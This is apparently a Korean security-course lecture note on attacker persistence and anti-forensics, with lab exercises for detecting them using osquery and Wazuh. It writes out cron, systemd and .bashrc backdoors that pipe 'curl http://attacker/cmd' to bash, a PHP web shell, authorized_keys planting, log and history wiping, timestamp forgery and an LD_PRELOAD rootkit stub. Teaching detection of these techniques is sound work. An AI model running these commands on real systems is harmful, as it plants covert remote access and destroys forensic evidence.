# Week 12 — 지속성 + 안티포렌식

> 본 주차는 attacker 가 침투 성공 후 **지속성 (Persistence)** 확보 + **anti-
> forensics** 로 흔적 제거. 단, 본 lab 은 학습 목적 — 영구화 미적용.

## 학습 목표

1. Persistence 5 패턴 (cron / systemd / .bashrc / SSH key / web shell)
2. anti-forensics — log 변조 / shred / .bash_history 제거
3. rootkit lite (LD_PRELOAD / kernel module)
4. DKMS, kernel module persistence
5. 운영 측 detection — osquery + Wazuh FIM

## 1. Persistence 5 패턴

### 1.1 cron

```
echo "*/5 * * * * curl -s http://attacker/cmd | bash" >> /etc/cron.d/system
```

### 1.2 systemd timer

```
cat > /etc/systemd/system/backdoor.service <<EOF
[Service]
ExecStart=/bin/bash -c "curl http://attacker/cmd | bash"
EOF
systemctl enable backdoor
```

### 1.3 .bashrc / .profile

```
echo 'curl http://attacker/cmd | bash &' >> ~/.bashrc
```

### 1.4 SSH authorized_keys

```
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
```

### 1.5 web shell

```
echo '<?php system($_GET["c"]); ?>' > /var/www/html/shell.php
```

## 2. anti-forensics

### 2.1 .bash_history 제거

```
unset HISTFILE; rm -f ~/.bash_history; history -c
```

### 2.2 log 변조

```
sed -i "/<attacker_ip>/d" /var/log/auth.log
echo "" > /var/log/syslog       # truncate
```

### 2.3 shred (overwrite)

```
shred -uvz suspicious_file
```

### 2.4 timestamp 변경

```
touch -r /etc/passwd suspicious_file   # /etc/passwd 의 mtime 으로 변경
```

## 3. rootkit lite (LD_PRELOAD)

```
# 정상 binary 의 read 함수를 hook 하여 sensitive 데이터 가림
cat > /tmp/rootkit.c <<'EOF'
#include <dlfcn.h>
ssize_t read(int fd, void *buf, size_t count) {
    ssize_t (*orig)(int, void*, size_t) = dlsym(RTLD_NEXT, "read");
    ssize_t r = orig(fd, buf, count);
    // ... filter
    return r;
}
EOF
gcc -shared -fPIC -o /tmp/rootkit.so /tmp/rootkit.c -ldl
echo "/tmp/rootkit.so" >> /etc/ld.so.preload
```

## 4. 운영 측 detection

| 패턴 | 탐지 도구 |
|------|-----------|
| cron entry | osquery crontab |
| systemd unit | osquery systemd_units |
| .bashrc 변경 | Wazuh FIM |
| authorized_keys 변경 | osquery authorized_keys |
| log 변조 | Wazuh FIM + remote syslog |
| LD_PRELOAD | osquery process_envs |

## 5. ATT&CK

| Technique |
|-----------|
| T1053.003 cron |
| T1543.002 systemd service |
| T1547.006 LD_PRELOAD |
| T1098.004 SSH authorized_keys |
| T1505.003 web shell |
| T1070.002 clear command history |
| T1070.004 file deletion |

## 6. 실습 (시뮬만, 영구화 X)

### 1 — cron 시뮬 (실 적용 X)

```bash
# /etc/crontab — 시스템 표준 cron table (root 권한)
#   각 row: <분> <시> <일> <월> <요일> <user> <command>
# /etc/cron.d/ — 개별 cron job 파일 (각 파일이 cron entry)
# 학습 점:
#   - 정상 환경: 시스템 표준 entry 만 (apt update / logrotate / 등)
#   - 침해 환경: 의심 entry (예: curl http://attacker | bash)
ssh 6v6-bastion 'cat /etc/crontab; echo "---"; ls /etc/cron.d/'
# 운영 측 detection: osquery 의 crontab 테이블 + Wazuh syscheck (FIM)
```

### 2 — authorized_keys 검사

```bash
# SSH authorized_keys — passwordless SSH login 허용 key list
#   각 row: <key type> <public key base64> <comment>
#   침해 시 attacker 가 자기 key 추가 → 비밀번호 없이 재진입
ssh 6v6-bastion '
sudo cat /root/.ssh/authorized_keys 2>/dev/null   # root user 의 keys
cat ~/.ssh/authorized_keys 2>/dev/null            # 현재 user 의 keys
'
# 정상: 학습 환경 keys 만 (admin / 강사 key)
# 의심: 알 수 없는 comment + 외부 IP / 비정상 timestamp
# 운영 측 detection:
#   - osquery authorized_keys 테이블 (모든 user 의 keys 조회)
#   - Wazuh FIM realtime=yes 로 ~/.ssh/ 감시
```

### 3 — .bashrc backdoor 시뮬

```bash
# .bashrc — 사용자 shell 시작 시 실행되는 script
#   침해 패턴: 끝에 'curl http://attacker | bash &' 추가
#   사용자가 SSH 진입 시마다 backdoor 실행
# 본 실습: 검사만, 실 변경 X
ssh 6v6-bastion 'tail -5 ~/.bashrc'
# 정상: alias / PS1 / source / export 등 표준 entry
# 의심: curl / wget / nc / bash -i / eval $(...) 등 의심 명령
# 운영 측 detection: Wazuh FIM 의 ~/.bashrc 변경 alert
```

### 4 — osquery 로 detection

```
ssh 6v6-web 'sudo osqueryi --json "SELECT * FROM crontab;"'
ssh 6v6-web 'sudo osqueryi --json "SELECT * FROM authorized_keys;"'
```

### 5 — log 변조 검출 (시뮬)

```
ssh 6v6-web 'sudo ls -la /var/log/apache2/'
# remote syslog 가 같은 log 를 manager 에 push → 변조 시 차이 detect
```

## 7. 과제

A. 5 패턴 시뮬 (필수) — 실 적용 X, log 만 기록
B. detection 권장 (심화)
C. anti-forensics 윤리 (정성)

## 8. W13 (Caldera) 예고

MITRE Caldera 로 위 패턴 자동화 + ATT&CK 매핑.
